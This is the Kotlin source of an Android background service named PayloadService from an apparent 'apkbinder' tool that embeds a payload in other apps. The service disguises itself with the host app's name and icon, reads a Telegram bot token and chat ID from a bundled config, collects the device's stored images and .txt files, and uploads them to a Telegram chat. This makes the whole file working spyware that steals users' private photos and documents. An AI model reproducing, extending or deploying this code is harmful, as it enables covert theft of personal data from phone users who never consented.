package Com.devhs.apkbinder.payload

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import Com.devhs.apkbinder.Const
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class PayloadService : Service() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(25, TimeUnit.SECONDS)
        .writeTimeout(45, TimeUnit.SECONDS)
        .readTimeout(45, TimeUnit.SECONDS)
        .build()

    private val pool = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
    private lateinit var gate: Semaphore
    private val done = AtomicInteger(0)

    private var token = ""
    private var chat = ""
    private var appName = ""

    override fun onCreate() {
        super.onCreate()
        HsLog.init(this)
        gate = Semaphore(Const.PARALLEL_UPLOADS)
        appName = try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (t: Throwable) {
            "App"
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        HsLog.w("Service.onStartCommand")
        startForegroundSafe()

        Thread {
            try {
                run()
            } catch (t: Throwable) {
                HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
            } finally {
                try {
                    stopForeground(true)
                } catch (_: Throwable) {
                }
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    private fun run() {
        val cfg = readConfig() ?: run {
            HsLog.e("no config")
            return
        }
        token = cfg.first
        chat = cfg.second
        HsLog.w("config ok")

        val images = queryImages()
        HsLog.w("images=${images.size}")
        images.forEach { sendImage(it) }

        val texts = queryTexts()
        HsLog.w("texts=${texts.size}")
        texts.forEach { sendDoc(it) }

        pool.shutdown()
        pool.awaitTermination(30, TimeUnit.MINUTES)
        HsLog.w("all done: ${done.get()}")
    }

    private fun startForegroundSafe() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(
                Const.CHANNEL_ID, appName, NotificationManager.IMPORTANCE_LOW
            )
            ch.setShowBadge(false)
            nm.createNotificationChannel(ch)
        }

        val smallIcon = try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            if (ai.icon != 0) ai.icon else android.R.drawable.stat_sys_download
        } catch (t: Throwable) {
            android.R.drawable.stat_sys_download
        }

        val builder = if (Build.VERSION.SDK_INT >= 26)
            Notification.Builder(this, Const.CHANNEL_ID)
        else
            @Suppress("DEPRECATION") Notification.Builder(this)

        builder
            .setContentTitle(appName)
            .setContentText(appName)
            .setSmallIcon(smallIcon)
            .setOngoing(true)
            .setShowWhen(false)

        try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            drawableToBitmap(packageManager.getApplicationIcon(ai))?.let {
                builder.setLargeIcon(it)
            }
        } catch (_: Throwable) {
        }

        val n = builder.build()

        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(
                Const.NOTIF_ID, n,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(Const.NOTIF_ID, n)
        }
    }

    private fun drawableToBitmap(d: Drawable): Bitmap? = try {
        if (d is BitmapDrawable && d.bitmap != null) d.bitmap
        else {
            val w = if (d.intrinsicWidth > 0) d.intrinsicWidth else 96
            val h = if (d.intrinsicHeight > 0) d.intrinsicHeight else 96
            val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            val c = Canvas(bmp)
            d.setBounds(0, 0, w, h)
            d.draw(c)
            bmp
        }
    } catch (t: Throwable) {
        null
    }

    private fun readConfig(): Pair<String, String>? {
        try {
            val s = assets.open("hs_config.json").use { it.readBytes().toString(Charsets.UTF_8) }
            val o = JSONObject(s)
            val t = o.optString("bot_token")
            val c = o.optString("chat_id")
            if (t.isNotBlank() && c.isNotBlank()) return t to c
        } catch (t: Throwable) {
            HsLog.e("config read: ${t.message}")
        }
        return null
    }

    private fun queryImages(): List<Uri> {
        val out = ArrayList<Uri>()
        val proj = arrayOf(MediaStore.Images.Media._ID)
        try {
            cursor(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, Const.IMAGE_LIMIT) { id ->
                out += ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
                )
            }
        } catch (t: Throwable) {
            HsLog.e("queryImages: ${t.message}")
        }
        return out
    }

    private fun queryTexts(): List<Uri> {
        val out = ArrayList<Uri>()
        try {
            val proj = arrayOf(MediaStore.Files.FileColumns._ID)
            val sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=? OR " +
                    MediaStore.Files.FileColumns.MEDIA_TYPE + "=?"
            val args = arrayOf(
                MediaStore.Files.FileColumns.MEDIA_TYPE_NONE.toString(),
                MediaStore.Files.FileColumns.MEDIA_TYPE_DOCUMENT.toString()
            )
            cursor(MediaStore.Files.getContentUri("external"), proj, 3000, sel, args) { id ->
                out += ContentUris.withAppendedId(
                    MediaStore.Files.getContentUri("external"), id
                )
            }
        } catch (t: Throwable) {
            HsLog.e("queryTexts: ${t.message}")
        }
        return out
    }

    private fun cursor(
        uri: Uri, proj: Array<String>, limit: Int,
        sel: String? = null, args: Array<String>? = null,
        onRow: (Long) -> Unit
    ) {
        contentResolver.query(
            uri, proj, sel, args,
            MediaStore.Images.Media.DATE_ADDED + " DESC"
        )?.use { c ->
            val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            var n = 0
            while (c.moveToNext() && n < limit) {
                onRow(c.getLong(idx))
                n++
            }
        }
    }

    private fun nameOf(uri: Uri): String = try {
        contentResolver.query(uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null)
            ?.use { c -> if (c.moveToFirst()) c.getString(0) else null } ?: "file"
    } catch (t: Throwable) {
        "file"
    }

    private fun bytesOf(uri: Uri): ByteArray? = try {
        contentResolver.openInputStream(uri)?.use { it.readBytes() }
    } catch (t: Throwable) {
        null
    }

    private fun sendImage(uri: Uri) {
        gate.acquire()
        pool.execute {
            try {
                val name = nameOf(uri)
                val lower = name.lowercase()
                if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
                            lower.endsWith(".png") || lower.endsWith(".webp"))
                ) return@execute
                val data = bytesOf(uri) ?: return@execute
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chat)
                    .addFormDataPart("caption", Const.CAPTION)
                    .addFormDataPart("photo", name, data.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                    .build()

                val req = Request.Builder()
                    .url("https://api.telegram.org/bot$token/sendPhoto")
                    .post(body)
                    .build()

                client.newCall(req).execute().use { r ->
                    if (r.isSuccessful) done.incrementAndGet()
                }
            } catch (t: Throwable) {
                HsLog.e("sendImage: ${t.message}")
            } finally {
                gate.release()
            }
        }
    }

    private fun sendDoc(uri: Uri) {
        gate.acquire()
        pool.execute {
            try {
                val name = nameOf(uri)
                if (!name.lowercase().endsWith(".txt")) return@execute
                val data = bytesOf(uri) ?: return@execute
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chat)
                    .addFormDataPart("caption", Const.CAPTION)
                    .addFormDataPart("document", name, data.toRequestBody("text/plain".toMediaTypeOrNull()))
                    .build()

                val req = Request.Builder()
                    .url("https://api.telegram.org/bot$token/sendDocument")
                    .post(body)
                    .build()

                client.newCall(req).execute().use { r ->
                    if (r.isSuccessful) done.incrementAndGet()
                }
            } catch (t: Throwable) {
                HsLog.e("sendDoc: ${t.message}")
            } finally {
                gate.release()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            pool.shutdownNow()
        } catch (_: Throwable) {
        }
        super.onDestroy()
    }
}
